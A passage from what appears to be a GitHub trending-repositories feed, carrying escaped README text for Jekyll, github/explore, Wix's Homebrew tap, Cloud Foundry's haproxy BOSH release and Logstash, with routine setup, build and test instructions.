how &lt;a href=&#34;https://jekyllrb.com/docs/front-matter/&#34;&gt;Front Matter&lt;/a&gt; works&lt;/li&gt; &#xA; &lt;li&gt;Put information on your site with &lt;a href=&#34;https://jekyllrb.com/docs/variables/&#34;&gt;Variables&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Customize the &lt;a href=&#34;https://jekyllrb.com/docs/permalinks/&#34;&gt;Permalinks&lt;/a&gt; your posts are generated with&lt;/li&gt; &#xA; &lt;li&gt;Use the built-in &lt;a href=&#34;https://jekyllrb.com/docs/templates/&#34;&gt;Liquid Extensions&lt;/a&gt; to make your life easier&lt;/li&gt; &#xA; &lt;li&gt;Use custom &lt;a href=&#34;https://jekyllrb.com/docs/plugins/&#34;&gt;Plugins&lt;/a&gt; to generate content specific to your site&lt;/li&gt; &#xA; &lt;li&gt;Watch &lt;a href=&#34;https://jekyllrb.com/tutorials/video-walkthroughs/&#34;&gt;video tutorials from Giraffe Academy&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Need help?&lt;/h2&gt; &#xA;&lt;p&gt;If you don&#39;t find the answer to your problem in our &lt;a href=&#34;https://jekyllrb.com/docs/&#34;&gt;docs&lt;/a&gt;, or in the &lt;a href=&#34;https://jekyllrb.com/docs/troubleshooting/&#34;&gt;troubleshooting section&lt;/a&gt;, ask the &lt;a href=&#34;https://jekyllrb.com/docs/community/&#34;&gt;community&lt;/a&gt; for help.&lt;/p&gt; &#xA;&lt;h2&gt;Code of Conduct&lt;/h2&gt; &#xA;&lt;p&gt;In order to have a more open and welcoming community, Jekyll adheres to a &lt;a href=&#34;https://jekyllrb.com/docs/conduct/&#34;&gt;code of conduct&lt;/a&gt; adapted from the Ruby on Rails code of conduct.&lt;/p&gt; &#xA;&lt;p&gt;Please adhere to this code of conduct in any interactions you have in the Jekyll community. It is strictly enforced on all official Jekyll repositories, websites, and resources. If you encounter someone violating these terms, please let one of our &lt;a href=&#34;https://jekyllrb.com/team/#core-team&#34;&gt;core team members&lt;/a&gt; know and we will address it as soon as possible.&lt;/p&gt; &#xA;&lt;h2&gt;Credits&lt;/h2&gt; &#xA;&lt;h3&gt;Sponsors&lt;/h3&gt; &#xA;&lt;p&gt;Support this project by becoming a sponsor. Your logo will show up in this README with a link to your website. &lt;a href=&#34;https://opencollective.com/jekyll#sponsor&#34;&gt;Become a sponsor!&lt;/a&gt; &lt;a href=&#34;https://opencollective.com/jekyll/sponsor/0/website&#34;&gt;&lt;img src=&#34;https://opencollective.com/jekyll/sponsor/0/avatar.svg?sanitize=true&#34; alt=&#34;Jekyll Sponsor 0&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opencollective.com/jekyll/sponsor/1/website&#34;&gt;&lt;img src=&#34;https://opencollective.com/jekyll/sponsor/1/avatar.svg?sanitize=true&#34; alt=&#34;Jekyll Sponsor 1&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opencollective.com/jekyll/sponsor/2/website&#34;&gt;&lt;img src=&#34;https://opencollective.com/jekyll/sponsor/2/avatar.svg?sanitize=true&#34; alt=&#34;Jekyll Sponsor 2&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opencollective.com/jekyll/sponsor/3/website&#34;&gt;&lt;img src=&#34;https://opencollective.com/jekyll/sponsor/3/avatar.svg?sanitize=true&#34; alt=&#34;Jekyll Sponsor 3&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opencollective.com/jekyll/sponsor/4/website&#34;&gt;&lt;img src=&#34;https://opencollective.com/jekyll/sponsor/4/avatar.svg?sanitize=true&#34; alt=&#34;Jekyll Sponsor 4&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opencollective.com/jekyll/sponsor/5/website&#34;&gt;&lt;img src=&#34;https://opencollective.com/jekyll/sponsor/5/avatar.svg?sanitize=true&#34; alt=&#34;Jekyll Sponsor 5&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opencollective.com/jekyll/sponsor/6/website&#34;&gt;&lt;img src=&#34;https://opencollective.com/jekyll/sponsor/6/avatar.svg?sanitize=true&#34; alt=&#34;Jekyll Sponsor 6&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opencollective.com/jekyll/sponsor/7/website&#34;&gt;&lt;img src=&#34;https://opencollective.com/jekyll/sponsor/7/avatar.svg?sanitize=true&#34; alt=&#34;Jekyll Sponsor 7&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opencollective.com/jekyll/sponsor/8/website&#34;&gt;&lt;img src=&#34;https://opencollective.com/jekyll/sponsor/8/avatar.svg?sanitize=true&#34; alt=&#34;Jekyll Sponsor 8&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opencollective.com/jekyll/sponsor/9/website&#34;&gt;&lt;img src=&#34;https://opencollective.com/jekyll/sponsor/9/avatar.svg?sanitize=true&#34; alt=&#34;Jekyll Sponsor 9&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Contributors&lt;/h3&gt; &#xA;&lt;p&gt;This project exists thanks to all the people who contribute. &lt;a href=&#34;https://raw.githubusercontent.com/jekyll/graphs/contributors&#34;&gt;&lt;img src=&#34;https://opencollective.com/jekyll/contributors.svg?width=890&amp;amp;button=false&#34; alt=&#34;Jekyll Contributors&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Backers&lt;/h3&gt; &#xA;&lt;p&gt;Thank you to all our backers! 🙏 &lt;a href=&#34;https://opencollective.com/jekyll#backer&#34;&gt;Become a backer&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://opencollective.com/jekyll#backers&#34;&gt;&lt;img src=&#34;https://opencollective.com/jekyll/backers.svg?width=890&#34; alt=&#34;Jekyll Backers&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;See the &lt;a href=&#34;https://github.com/jekyll/jekyll/raw/master/LICENSE&#34;&gt;LICENSE&lt;/a&gt; file.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>github/explore</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/github/explore</id>
    <link href="https://github.com/github/explore" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Community-curated topic and collection pages on GitHub&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;GitHub Explore&lt;/h1&gt; &#xA;&lt;p&gt;This repository houses all of the community-curated content for GitHub Topics and Collections.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://help.github.com/articles/about-topics/&#34;&gt;Topics&lt;/a&gt; help you explore repositories in a particular subject area, learn more about that subject, and find projects to contribute to.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/collections&#34;&gt;Collections&lt;/a&gt; help you discover hand-picked repositories, developers, organizations, videos, and articles that share a common theme.&lt;/p&gt; &#xA;&lt;p&gt;If you want to suggest edits to an existing topic page or collection, or curate a new one, read our &lt;a href=&#34;https://raw.githubusercontent.com/github/explore/main/CONTRIBUTING.md&#34;&gt;contributing guide&lt;/a&gt; to get started. You can also &lt;a href=&#34;https://raw.githubusercontent.com/github/explore/main/topics-todo.md&#34;&gt;review a list of popular topics that need more context&lt;/a&gt; to get an idea of where to start.&lt;/p&gt; &#xA;&lt;h2&gt;Running tests&lt;/h2&gt; &#xA;&lt;p&gt;There are some lint tests in place to ensure each topic is formatted in the way we expect. Travis CI will run the tests automatically. If you want to run the tests yourself locally, you will need Ruby and Bundler installed.&lt;/p&gt; &#xA;&lt;p&gt;You can run the tests using:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;script/cibuild&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Licenses&lt;/h2&gt; &#xA;&lt;p&gt;Content is released under &lt;a href=&#34;https://creativecommons.org/licenses/by/4.0/&#34;&gt;CC-BY-4.0&lt;/a&gt; which gives you permission to use content for almost any purpose (but does not grant you any trademark permissions). See &lt;a href=&#34;https://raw.githubusercontent.com/github/explore/main/notices.md&#34;&gt;notices&lt;/a&gt; for complete details, including attribution guidelines, contribution terms, and software and third-party licenses and permissions.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>wix/homebrew-brew</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/wix/homebrew-brew</id>
    <link href="https://github.com/wix/homebrew-brew" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Homebrew tap for formulae for software developed by Wix&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Wix Homebrew Tap&lt;/h1&gt; &#xA;&lt;p&gt;This is a &lt;a href=&#34;http://brew.sh/&#34;&gt;Homebrew&lt;/a&gt; tap for formulae for software developed by Wix.&lt;/p&gt; &#xA;&lt;h2&gt;Setup&lt;/h2&gt; &#xA;&lt;p&gt;Using these formulae requires Homebrew, which in turn requires Xcode. If you have not yet installed Homebrew, a quick summary is at the end of this document.&lt;/p&gt; &#xA;&lt;p&gt;Once homebrew is installed, simply run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;brew tap wix/brew&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Use&lt;/h2&gt; &#xA;&lt;p&gt;To install software, just use &lt;code&gt;brew install&lt;/code&gt; with the name of the formula. You may wish to run &lt;code&gt;brew update&lt;/code&gt; before hand to get the latest version of the formulae. For example, to install the latest version of the Apple simulator utilities:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;brew tap wix/brew&#xA;brew update&#xA;brew install wix/applesimutils&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To upgrade software:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;brew update&#xA;# update just applesimutils&#xA;brew upgrade applesimutils&#xA;# or,&#xA;# upgrade all software installed with Homebrew&#xA;brew upgrade&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Troubleshooting&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;In case an installation fails, make sure to update your command line tools in the System Update system prefernce pane of your Mac&lt;/li&gt; &#xA; &lt;li&gt;If Homebrew complains about a conflict in the &lt;code&gt;wix/brew&lt;/code&gt; tap, run &lt;code&gt;brew untap wix/brew &amp;amp;&amp;amp; brew tap wix/brew&lt;/code&gt; and try installing again&lt;/li&gt; &#xA; &lt;li&gt;If installation still fails, &lt;strong&gt;run &lt;code&gt;brew doctor&lt;/code&gt; and fix all issues &amp;amp; warnings&lt;/strong&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;Please file bug reports and/or enhancement requests as GitHub issues of the individual projects, not this repository.&lt;/p&gt; &#xA;&lt;h2&gt;References&lt;/h2&gt; &#xA;&lt;p&gt;&lt;code&gt;brew help&lt;/code&gt;, &lt;code&gt;man brew&lt;/code&gt;, or the Homebrew &lt;a href=&#34;https://github.com/Homebrew/homebrew/tree/master/share/doc/homebrew#readme&#34;&gt;documentation&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>cloudfoundry/haproxy-boshrelease</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/cloudfoundry/haproxy-boshrelease</id>
    <link href="https://github.com/cloudfoundry/haproxy-boshrelease" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A BOSH release for haproxy (based on cf-release&#39;s haproxy job)&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;BOSH Release for haproxy&lt;/h1&gt; &#xA;&lt;p&gt;Questions? Pop in our &lt;a href=&#34;https://cloudfoundry.slack.com/messages/haproxy-boshrelease/&#34;&gt;slack channel&lt;/a&gt;!&lt;/p&gt; &#xA;&lt;p&gt;This BOSH release is an attempt to get a more customizable/secure haproxy release than what is provided in &lt;a href=&#34;https://github.com/cloudfoundry/cf-release&#34;&gt;cf-release&lt;/a&gt;. It allows users to blacklist internal-only domains, preventing potential Host header spoofing from allowing unauthorized access of internal APIs. It also allows for better control over haproxy&#39;s timeouts, for greater resiliency under heavy load.&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;p&gt;To deploy this BOSH release:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/cloudfoundry-community/haproxy-boshrelease.git&#xA;cd haproxy-boshrelease&#xA;&#xA;export BOSH_ENVIRONMENT=&amp;lt;alias&amp;gt;&#xA;export BOSH_DEPLOYMENT=haproxy&#xA;bosh2 deploy manifests/haproxy.yml \&#xA;  -v haproxy-backend-port=80 \&#xA;  -v &#34;haproxy-backend-servers=[10.10.10.10,10.10.10.11]&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To make alterations to the deployment you can use the &lt;code&gt;bosh2 deploy [-o operator-file.yml]&lt;/code&gt; flag to provide &lt;a href=&#34;https://bosh.io/docs/cli-ops-files.html&#34;&gt;operations files&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Alternately you can build a manifest using &lt;code&gt;templates/make_manifest&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;You can either use the templates + examples provided to merge this in with an existing CloudFoundry deployment, or create a new deployment using this command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;make_manifest &amp;lt;aws-ec2|warden&amp;gt; &amp;lt;comma-separated-list-of-router-servers&amp;gt; &amp;lt;additional_templates&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: &lt;code&gt;make_manifest&lt;/code&gt; requires &lt;a href=&#34;https://github.com/geofffranks/spruce&#34;&gt;spruce v1.8.9&lt;/a&gt; or newer.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# Example for bare bones bosh-lite haproxy release on warden&#xA;templates/make_manifest warden 10.244.0.22&#xA;bosh deploy&#xA;&#xA;# Example for using keepalive with haproxy on warden:&#xA;KEEPALIVED_VIP=10.244.50.2 templates/make_manifest warden 10.244.0.22&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Development&lt;/h3&gt; &#xA;&lt;p&gt;Feel free to contribute back to this via a pull request on a feature branch! Once merged, we&#39;ll cut a new final release for you.&lt;/p&gt; &#xA;&lt;h3&gt;Unit Tests and Linting&lt;/h3&gt; &#xA;&lt;p&gt;If you change any erb logic in the jobs directory please add a corresponding test to &lt;code&gt;spec&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To run these tests:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;cd haproxy_boshrelease&#xA;bundle install&#xA;bundle exec rake spec&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To run lint with rubocop&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;cd haproxy_boshrelease&#xA;bundle install&#xA;bundle exec rake lint&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To watch the tests while developing&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;cd haproxy_boshrelease&#xA;bundle install&#xA;bundle exec guard&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;PRs will be automatically tested by &lt;a href=&#34;https://concourse.cfi.sapcloud.io/teams/main/pipelines/haproxy-boshrelease&#34;&gt;https://concourse.cfi.sapcloud.io/teams/main/pipelines/haproxy-boshrelease&lt;/a&gt; once a maintainer has labelled the PR with the &lt;code&gt;approved&lt;/code&gt; label&lt;/p&gt; &#xA;&lt;h3&gt;Acceptance tests&lt;/h3&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://raw.githubusercontent.com/cloudfoundry/haproxy-boshrelease/master/acceptance-tests/README.md&#34;&gt;here&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>elastic/logstash</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/elastic/logstash</id>
    <link href="https://github.com/elastic/logstash" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Logstash - transport and process your logs, events, or other data&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Logstash&lt;/h1&gt; &#xA;&lt;p&gt;Logstash is part of the &lt;a href=&#34;https://www.elastic.co/products&#34;&gt;Elastic Stack&lt;/a&gt; along with Beats, Elasticsearch and Kibana. Logstash is a server-side data processing pipeline that ingests data from a multitude of sources simultaneously, transforms it, and then sends it to your favorite &#34;stash.&#34; (Ours is Elasticsearch, naturally.). Logstash has over 200 plugins, and you can write your own very easily as well.&lt;/p&gt; &#xA;&lt;p&gt;For more info, see &lt;a href=&#34;https://www.elastic.co/products/logstash&#34;&gt;https://www.elastic.co/products/logstash&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Documentation and Getting Started&lt;/h2&gt; &#xA;&lt;p&gt;You can find the documentation and getting started guides for Logstash on the &lt;a href=&#34;https://www.elastic.co/guide/en/logstash/current/getting-started-with-logstash.html&#34;&gt;elastic.co site&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;For information about building the documentation, see the README in &lt;a href=&#34;https://github.com/elastic/docs&#34;&gt;https://github.com/elastic/docs&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Downloads&lt;/h2&gt; &#xA;&lt;p&gt;You can download officially released Logstash binaries, as well as debian/rpm packages for the supported platforms, from &lt;a href=&#34;https://www.elastic.co/downloads/logstash&#34;&gt;downloads page&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Need Help?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://discuss.elastic.co/c/logstash&#34;&gt;Logstash Forum&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.elastic.co/guide/en/logstash/current/index.html&#34;&gt;Logstash Documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://webchat.freenode.net/?channels=logstash&#34;&gt;#logstash on freenode IRC&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.elastic.co/products/logstash&#34;&gt;Logstash Product Information&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.elastic.co/subscriptions&#34;&gt;Elastic Support&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Logstash Plugins&lt;/h2&gt; &#xA;&lt;p&gt;Logstash plugins are hosted in separate repositories under the &lt;a href=&#34;https://github.com/logstash-plugins&#34;&gt;logstash-plugins&lt;/a&gt; github organization. Each plugin is a self-contained Ruby gem which gets published to RubyGems.org.&lt;/p&gt; &#xA;&lt;h3&gt;Writing your own Plugin&lt;/h3&gt; &#xA;&lt;p&gt;Logstash is known for its extensibility. There are hundreds of plugins for Logstash and you can write your own very easily! For more info on developing and testing these plugins, please see the &lt;a href=&#34;https://www.elastic.co/guide/en/logstash/current/contributing-to-logstash.html&#34;&gt;working with plugins section&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Plugin Issues and Pull Requests&lt;/h3&gt; &#xA;&lt;p&gt;&lt;strong&gt;Please open new issues and pull requests for plugins under its own repository&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;For example, if you have to report an issue/enhancement for the Elasticsearch output, please do so &lt;a href=&#34;https://github.com/logstash-plugins/logstash-output-elasticsearch/issues&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Logstash core will continue to exist under this repository and all related issues and pull requests can be submitted here.&lt;/p&gt; &#xA;&lt;h2&gt;Developing Logstash Core&lt;/h2&gt; &#xA;&lt;h3&gt;Prerequisites&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Install JDK version 11 or 17. Make sure to set the &lt;code&gt;JAVA_HOME&lt;/code&gt; environment variable to the path to your JDK installation directory. For example &lt;code&gt;set JAVA_HOME=&amp;lt;JDK_PATH&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Install JRuby 9.2.x It is recommended to use a Ruby version manager such as &lt;a href=&#34;https://rvm.io/&#34;&gt;RVM&lt;/a&gt; or &lt;a href=&#34;https://github.com/sstephenson/rbenv&#34;&gt;rbenv&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Install &lt;code&gt;rake&lt;/code&gt; and &lt;code&gt;bundler&lt;/code&gt; tool using &lt;code&gt;gem install rake&lt;/code&gt; and &lt;code&gt;gem install bundler&lt;/code&gt; respectively.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;RVM install (optional)&lt;/h3&gt; &#xA;&lt;p&gt;If you prefer to use rvm (ruby version manager) to manage Ruby versions on your machine, follow these directions. In the Logstash folder:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3&#xA;\curl -sSL https://get.rvm.io | bash -s stable --ruby=$(cat .ruby-version)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Check Ruby version&lt;/h3&gt; &#xA;&lt;p&gt;Before you proceed, please check your ruby version by:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ ruby -v&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The printed version should be the same as in the &lt;code&gt;.ruby-version&lt;/code&gt; file.&lt;/p&gt; &#xA;&lt;h3&gt;Building Logstash&lt;/h3&gt; &#xA;&lt;p&gt;The Logstash project includes the source code for all of Logstash, including the Elastic-Licensed X-Pack features and functions; to run Logstash from source using only the OSS-licensed code, export the &lt;code&gt;OSS&lt;/code&gt; environment variable with a value of &lt;code&gt;true&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;export OSS=true&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Set up the location of the source code to build&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;export LOGSTASH_SOURCE=1&#xA;export LOGSTASH_PATH=/YOUR/LOGSTASH/DIRECTORY&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;To run Logstash from the repo you must first bootstrap the environment:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;rake bootstrap&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;You can then use &lt;code&gt;bin/logstash&lt;/code&gt; to start Logstash, but there are no plugins installed. To install default plugins, you can run:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;rake plugin:install-default&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This will install the 80+ default plugins which makes Logstash ready to connect to multiple data sources, perform transformations and send the results to Elasticsearch and other destinations.&lt;/p&gt; &#xA;&lt;p&gt;To verify your environment, run the following to send your first event:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;bin/logstash -e &#39;input { stdin { } } output { stdout {} }&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This should start Logstash with stdin input waiting for you to enter an event&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;hello world&#xA;2016-11-11T01:22:14.405+0000 0.0.0.0 hello world&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Advanced: Drip Launcher&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/ninjudd/drip&#34;&gt;Drip&lt;/a&gt; is a tool that solves the slow JVM startup problem while developing Logstash. The drip script is intended to be a drop-in replacement for the java command. We recommend using drip during development, in particular for running tests. Using drip, the first invocation of a command will not be faster but the subsequent commands will be swift.&lt;/p&gt; &#xA;&lt;p&gt;To tell logstash to use drip, set the environment variable &lt;code&gt;JAVACMD=`which drip`&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Example (but see the &lt;em&gt;Testing&lt;/em&gt; section below before running rspec for the first time):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;JAVACMD=`which drip` bin/rspec&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Caveats&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Drip does not work with STDIN. You cannot use drip for running configs which use the stdin plugin.&lt;/p&gt; &#xA;&lt;h2&gt;Building Logstash Documentation&lt;/h2&gt; &#xA;&lt;p&gt;To build the Logstash Reference (open source content only) on your local machine, clone the following repos:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/elastic/logstash&#34;&gt;logstash&lt;/a&gt; - contains main docs about core features&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/elastic/logstash-docs&#34;&gt;logstash-docs&lt;/a&gt; - contains generated plugin docs&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/elastic/docs&#34;&gt;docs&lt;/a&gt; - contains doc build files&lt;/p&gt; &#xA;&lt;p&gt;Make sure you have the same branch checked out in &lt;code&gt;logstash&lt;/code&gt; and &lt;code&gt;logstash-docs&lt;/code&gt;. Check out &lt;code&gt;master&lt;/code&gt; in the &lt;code&gt;docs&lt;/code&gt; repo.&lt;/p&gt; &#xA;&lt;p&gt;Run the doc build script from within the &lt;code&gt;docs&lt;/code&gt; repo. For example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./build_docs.pl --doc ../logstash/docs/index.asciidoc --chunk=1 -open&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Testing&lt;/h2&gt; &#xA;&lt;p&gt;Most of the unit tests in Logstash are written using &lt;a href=&#34;http://rspec.info/&#34;&gt;rspec&lt;/a&gt; for the Ruby parts. For the Java parts, we use junit. For testing you can use the &lt;em&gt;test&lt;/em&gt; &lt;code&gt;rake&lt;/code&gt; tasks and the &lt;code&gt;bin/rspec&lt;/code&gt; command, see instructions below:&lt;/p&gt; &#xA;&lt;h3&gt;Core tests&lt;/h3&gt; &#xA;&lt;p&gt;1- To run the core tests you can use the Gradle task:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./gradlew test&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;or use the &lt;code&gt;rspec&lt;/code&gt; tool to run all tests or run a specific test:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;bin/rspec&#xA;bin/rspec spec/foo/bar_spec.rb&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note that before running the &lt;code&gt;rspec&lt;/code&gt; command for the first time you need to set up the RSpec test dependencies by running:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./gradlew bootstrap&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2- To run the subset of tests covering the Java codebase only run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./gradlew javaTests&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;3- To execute the complete test-suite including the integration tests run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./gradlew check&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;4- To execute a single Ruby test run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;SPEC_OPTS=&#34;-fd -P logstash-core/spec/logstash/api/commands/default_metadata_spec.rb&#34; ./gradlew :logstash-core:rubyTests --tests org.logstash.RSpecTests    &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;5- To execute single spec for integration test, run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./gradlew integrationTests -PrubyIntegrationSpecs=specs/slowlog_spec.rb&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Sometimes you might find a change to a piece of Logstash code causes a test to hang. These can be hard to debug.&lt;/p&gt; &#xA;&lt;p&gt;If you set &lt;code&gt;LS_JAVA_OPTS=&#34;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005&#34;&lt;/code&gt; you can connect to a running Logstash with your IDEs debugger which can be a great way of finding the issue.&lt;/p&gt; &#xA;&lt;h3&gt;Plugins tests&lt;/h3&gt; &#xA;&lt;p&gt;To run the tests of all currently installed plugins:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;rake test:plugins&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can install the default set of plugins included in the logstash package:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;rake test:install-default&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;Note that if a plugin is installed using the plugin manager &lt;code&gt;bin/logstash-plugin install ...&lt;/code&gt; do not forget to also install the plugins development dependencies using the following command after the plugin installation:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;bin/logstash-plugin install 